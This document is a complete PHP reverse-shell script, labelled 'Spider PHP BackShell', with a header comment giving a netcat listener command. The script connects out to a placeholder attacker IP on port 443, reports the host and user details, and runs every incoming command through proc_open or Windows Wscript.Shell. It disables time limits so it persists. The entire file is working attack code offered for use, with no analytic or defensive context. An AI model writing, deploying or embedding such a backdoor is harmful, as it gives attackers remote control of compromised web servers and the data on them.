<?php 
/*******************************
 *兼容Windows & Linux
 *作者 Spider
 *nc -vvlp 443
********************************/

ignore_user_abort(true);
ini_set('max_execution_time',0);

$ipaddr = 'xxx.xxx.xxx.xxx';
$port = '443';

$cwd = getcwd();
$var = "\x53\x70\x69\x64\x65\x72";
$msg  = php_uname()."\n\n------------Spider PHP BackShell-------------\n------ whoami(";
$msg .= get_current_user().") uid(".getmyuid().") gid(".getmygid().") ------\n\n[$var:$cwd]# ";

function procopen($cmd,$env,$sock,$cwd,$type) {
        $descriptorspec = array(0 => array("pipe","r"),1 => array("pipe","w"),2 => array("pipe","w"));
        $process = proc_open($cmd,$descriptorspec,$pipes,$cwd,$env);
        if (is_resource($process)) {
                fwrite($pipes[0],$cmd);
                fclose($pipes[0]);
                $msg = stream_get_contents($pipes[1]);
                $type ? fwrite($sock,$msg) : socket_write($sock,$msg);
                fclose($pipes[1]);
                $msg = stream_get_contents($pipes[2]);
                $type ? fwrite($sock,$msg) : socket_write($sock,$msg);
                fclose($pipes[2]);
                proc_close($process);
        }
        return true;
}

function command($cmd,$sock,$cwd,$type) {
        if(substr(PHP_OS,0,3) == 'WIN') {
                $wscript = new COM("Wscript.Shell");
                $sysdir = 'C:\\windows\\system32';
                if($wscript && class_exists('COM')) {
                        $exec = $wscript->exec($sysdir.'\\cmd.exe /c '.$cmd);
                        $stdout = $exec->StdOut();
                        $stroutput = $stdout->ReadAll();
                        fwrite($sock,$stroutput);
                } else {
                        $env = array('path' => $sysdir);
                        procopen($cmd,$env,$sock,$cwd,$type);
                }
        } else {
                $env = array('path' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');
                procopen($cmd,$env,$sock,$cwd,$type);
        }
        return true;
}

if(function_exists('fsockopen')) {
        
        $sock = fsockopen($ipaddr,$port);
        fwrite($sock,$msg);
        while ($cmd = fread($sock,1024)) {
                if (substr($cmd,0,3) == 'cd ') {
                        $cwd = trim(substr($cmd,3,-1));
                        chdir($cwd);
                        $cwd = getcwd();
                } elseif (trim(strtolower($cmd)) == 'exit') {
                        echo 'close'; break;
                } else {
                        command($cmd,$sock,$cwd,true);
                }
                fwrite($sock,'['.$var.':'.$cwd.']# ');
        }
        fclose($sock);
        
} elseif(function_exists('socket_close')) {
        
        $sock = socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
        socket_connect($sock,$ipaddr,$port);
        socket_write($sock,$msg);
        fwrite($sock,$msg);
        while ($cmd = socket_read($sock,1024)) {
                if (substr($cmd,0,3) == 'cd ') {
                        $cwd = trim(substr($cmd,3,-1));
                        chdir($cwd);
                        $cwd = getcwd();
                } elseif (trim(strtolower($cmd)) == 'exit') {
                        echo 'close'; break;
                } else {
                        command($cmd,$sock,$cwd,false);
                }
                socket_write($sock,'['.$var.':'.$cwd.']# ');
        }
        socket_close($sock);
        
} else {
        
        echo 'Fail!';
        
}

?>
